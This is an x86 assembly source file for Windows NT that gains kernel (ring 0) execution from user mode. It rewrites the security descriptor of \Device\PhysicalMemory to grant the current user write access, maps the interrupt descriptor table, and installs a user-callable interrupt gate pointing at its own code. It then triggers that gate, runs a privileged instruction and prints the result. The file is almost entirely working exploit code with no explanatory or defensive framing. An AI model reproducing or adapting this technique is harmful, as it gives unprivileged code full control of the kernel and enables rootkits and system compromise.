
.386p
.model  flat

extern  GetModuleHandleA:proc
extern  GetProcAddress:proc
extern  LoadLibraryA:proc
extern  FreeLibrary:proc
extern  CloseHandle:proc
extern  MapViewOfFile:proc
extern  UnmapViewOfFile:proc
extern  WriteFile:proc
extern  ExitProcess:proc

OBJ_CASE_INSENSITIVE            equ     40h
SECTION_MAP_WRITE               equ     2
SECTION_MAP_READ                equ     4
MEM_PRIVATE                     equ     20000h
MEM_MAPPED                      equ     40000h
DACL_SECURITY_INFORMATION       equ     4
SE_KERNEL_OBJECT                equ     6
GRANT_ACCESS                    equ     1
NO_MULTIPLE_TRUSTEE             equ     0
TRUSTEE_IS_NAME                 equ     1
TRUSTEE_IS_USER                 equ     1
INTNUMBER                       equ     0ffh

.data
ntdll                   db      "ntdll", 0
NtOpenSection           db      "NtOpenSection", 0
SetSecurityInfo         db      "SetSecurityInfo", 0
SetEntriesInAclA        db      "SetEntriesInAclA", 0
GetSecurityInfo         db      "GetSecurityInfo", 0
advapi32                db      "advapi32", 0
object_name             dw      offset object_buffer_e1 - offset object_buffer, offset object_buffer_e2 - offset object_buffer
                        dd      offset object_buffer
object_buffer           dw      '\', 'd', 'e', 'v', 'i', 'c', 'e', '\', 'p', 'h', 'y', 's', 'i', 'c', 'a', 'l', 'm', 'e', 'm', 'o', 'r', 'y'
object_buffer_e1        dw      0
object_buffer_e2        equ     $
align 4 ;required for object_attributes
object_attributes       dd      offset object_attributes_e - offset object_attributes, 0, offset object_name, OBJ_CASE_INSENSITIVE, 0, 0
object_attributes_e     equ     $
explicit_access         dd      SECTION_MAP_WRITE, GRANT_ACCESS, 0, 0, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_NAME, TRUSTEE_IS_USER, offset current_user
current_user            db      "CURRENT_USER", 0
instaddr                db      0ah dup (?)

.code
code_begin      label   near
        push    offset ntdll
        call    GetModuleHandleA
        test    eax, eax
        je      exit_code
        push    offset NtOpenSection
        push    eax
        call    GetProcAddress
        xchg    esi, eax
        push    eax
        mov     ebx, esp
        mov     edi, offset object_attributes
        push    edi
        push    SECTION_MAP_READ or SECTION_MAP_WRITE
        push    ebx
        call    esi
        test    eax, eax
        jns     hook_interrupt
        push    edi
        push    MEM_MAPPED or MEM_PRIVATE
        push    ebx
        call    esi
        push    eax
        mov     ebp, esp
        xor     eax, eax
        push    eax
        push    eax
        mov     ecx, esp
        push    eax
        mov     edx, esp
        push    eax
        push    DACL_SECURITY_INFORMATION
        push    SE_KERNEL_OBJECT
        push    dword ptr [ebx]
        push    offset SetSecurityInfo
        push    ecx
        push    edx
        push    offset explicit_access
        push    1
        push    offset SetEntriesInAclA
        push    ebp
        push    eax
        push    edx
        push    eax
        push    eax
        push    DACL_SECURITY_INFORMATION
        push    SE_KERNEL_OBJECT
        push    dword ptr [ebx]
        push    offset GetSecurityInfo
        push    offset advapi32
        call    LoadLibraryA
        push    eax
        xchg    ebp, eax
        call    GetProcAddress
        call    eax
        push    ebp
        call    GetProcAddress
        call    eax
        push    ebp
        call    GetProcAddress
        call    eax
        pop     eax
        push    ebp
        call    FreeLibrary
        push    dword ptr [ebx]
        call    CloseHandle
        push    edi
        push    SECTION_MAP_READ or SECTION_MAP_WRITE
        push    ebx
        call    esi
        test    eax, eax
        js      exit_code

hook_interrupt  label   near
        push    eax
        sidt    fword ptr [esp - 2]
        pop     esi
        btr     esi, 1fh
        push    1
        push    esi
        push    0
        push    SECTION_MAP_WRITE
        push    dword ptr [ebx]
        call    MapViewOfFile
        push    eax
        and     esi, 0fffh
        lea     esi, dword ptr [eax + esi + INTNUMBER * 8]
        fild    qword ptr [esi]
        call    skip_ring0

        ;begin ring 0

        mov     ebp, cr0
        iretd

        ;end ring 0

skip_ring0      label   near
        pop     word ptr [esi]
        mov     byte ptr [esi + 2], 8
        mov     byte ptr [esi + 5], 0eeh
        pop     word ptr [esi + 6]
        int     INTNUMBER
        fistp   qword ptr [esi]
        call    UnmapViewOfFile
        call    CloseHandle
        push    0
        push    esp
        push    size instaddr
        mov     edi, offset instaddr
        push    edi
        push    -11                             ;STD_OUTPUT_HANDLE
        call    hex2asc                         ;convert offset to ASCII
        mov     ax, 0a0dh
        stos    word ptr [edi]
        call    WriteFile                       ;print to screen

exit_code       label   near
        push    0
        call    ExitProcess

hex2asc         proc    near
        call    dd2asc

dd2asc          proc    near
        call    dw2asc

dw2asc          proc    near
        shld    eax, ebp, 8
        shl     ebp, 8
        aam     10h
        call    db2asc

db2asc          proc    near
        xchg    ah, al
        cmp     al, 0ah
        sbb     al, 69h
        das
        stos    byte ptr [edi]
        ret
db2asc          endp
dw2asc          endp
dd2asc          endp
hex2asc         endp
end             code_begin
